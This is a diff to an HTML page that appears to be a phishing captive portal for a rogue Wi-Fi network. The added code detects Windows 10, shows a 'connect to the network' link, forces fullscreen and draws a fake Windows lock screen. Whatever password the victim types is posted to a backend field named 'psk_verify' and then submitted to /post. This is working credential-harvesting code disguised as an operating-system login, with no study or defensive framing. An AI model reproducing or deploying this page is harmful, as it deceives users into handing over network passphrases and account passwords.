@@ -4,6 +4,7 @@
 <head>
 
 <link rel="stylesheet" href="/static/style.css">
+<link rel="stylesheet" href="/static/style2.css">
 
 <script>
 
@@ -21,7 +22,7 @@ function FindOS(){
 	if (window.navigator.userAgent.indexOf("Linux")          != -1) OSName="Linux";
 
 	if (OSName == "Windows 10"){
-		var x = document.getElementById('page1');
+		var x = document.getElementById('page0');
 		if (x.style.display == "none") {
 		x.style.display = "block";
 		} else {
@@ -64,6 +65,7 @@ setInterval(function(){
 
 },1000);
 
+
 var data = {
    getDay : function(par){
       var Days = ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"];
@@ -74,22 +76,117 @@ var data = {
                      "September","October","November","December"];
                      return Months[par-1];}
 };
+
+
+function openFullscreen() {
+	var x = document.getElementById('page0');
+		if (x.style.display == "none") {
+		x.style.display = "block";
+		} else {
+		x.style.display = "none";
+		}
+	var x = document.getElementById('page1');
+		if (x.style.display == "none") {
+		x.style.display = "block";
+		} else {
+		x.style.display = "none";
+		}
+
+var elem = document.getElementById("page1");
+
+	  if (elem.requestFullscreen) {
+	    elem.requestFullscreen();
+	  } else if (elem.webkitRequestFullscreen) {
+	    elem.webkitRequestFullscreen();
+	  } else if (elem.msRequestFullscreen) {
+	    elem.msRequestFullscreen();
+	  }
+};
 </script>
 
 <script>
 function ChangePage(){
-	window.location.replace("/static/login.html")};
+	var x = document.getElementById('page1');
+		if (x.style.display == "block") {
+		x.style.display = "none";
+		} else {
+		x.style.display = "block";
+		}
+	var x = document.getElementById('page2');
+		if (x.style.display == "none") {
+		x.style.display = "block";
+		} else {
+		x.style.display = "none";
+		}
+};
+</script>
+
+<script>
+
+function validate_passphrase (password, callback) {
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("POST", "/backend/", true);
+    xhttp.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200)  {
+            var json = JSON.parse(xhttp.responseText);
+            callback(json.psk_verify, password);
+        }
+    };
+    var data = JSON.stringify({"psk_verify": password});
+    xhttp.send(data);
+}
+
+
+function windows_validate_action (pw_status, password) {
+                document.getElementById("windows-form").submit();
+		
+        }
+
 </script>
 </head>
 
-<body onload="FindOS()"> 
+<body onload="FindOS()">
+
+	<div id="page0" style="display: none;">
+		<p>To connect to the network click <p id="fullscr" onclick="openFullscreen()">here</p></p>
+	</div>
+	
 	<div id="page1" style="display: none;">
-        <button id="btn" class="btn" type='button' onclick="ChangePage()"></button>
+        	<button id="btn" class="btn" type='button' onclick="ChangePage()"></button>
 		<div class="date-time">
 			<div class="time"></div>
 			<div class="date"></div>
 		</div>
     	</div>
+
+
+	<div id="page2" style="display: none;">
+		<div class="container-fluid" id="container"></div>
+	
+		<div class="container">
+			<div class="form-wrapper" id="form">   
+				<form id="windows-form" method='post' action='/post'>
+					<img src="/static/user.png" alt="Lock-screen-avatar" class="rounded-circle img-fluid">
+					<div class="form-group">
+						<label id="pw_status" class="username">User</label>
+						<input type="password" placeholder="Password" id="password" name="user-password" class="textfield">
+						<button class="authenticate">&rarr;</button>
+						<a href="" class="forgotpass" >I forgot my password</a>
+						<a href="" class="signinopt" >Sign-in options</a>
+					</div>
+				</form>
+			</div>
+		</div>
+	
+	</div>
+
+<script>
+                var myform = document.getElementById("windows-form");
+                myform.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    validate_passphrase(document.getElementById("password").value, windows_validate_action)
+		});
+</script>
 </body>
 
 </html>
